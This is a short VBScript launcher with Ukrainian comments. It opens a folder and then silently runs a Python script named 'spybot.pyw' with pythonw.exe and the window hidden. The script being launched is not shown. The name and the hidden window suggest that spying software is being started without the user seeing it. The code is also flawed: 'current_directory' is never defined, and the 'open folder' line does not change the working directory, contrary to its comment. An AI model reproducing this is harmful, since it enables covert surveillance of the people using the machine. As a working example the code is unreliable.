Set WshShell = CreateObject("WScript.Shell")
Dim fso, f1
Set fso = CreateObject("Shell.Application")

REM Змінюємо директорію на папку зі скриптом
fso.Open current_directory & "\"

REM Запускаємо Python без вікна
WshShell.Run "pythonw.exe spybot.pyw", 0, False